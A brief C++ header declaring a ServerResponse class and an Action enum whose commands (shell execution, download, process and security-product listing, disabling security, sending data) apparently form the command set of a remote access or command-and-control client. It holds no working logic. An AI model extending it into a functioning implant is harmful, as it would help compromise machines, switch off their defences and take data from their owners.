#pragma once
#include<iostream>

enum Action {
	CMD,
	ADMIN,
	EXECUTE,
	DOWNLOAD,
	FILE_LIST,
	PROCESS_LIST,
	SECURITY_LIST,
	SECURITY_DISABLE,
	CREATE_FILE,
	CREATE_DIR,
	GET_PATH,
	SEND,
	NONE
};

class ServerResponse
{
public:
	ServerResponse(std::string data);
	int id = -1;
	enum Action action = NONE;
	std::string arg = "";
	~ServerResponse();
};

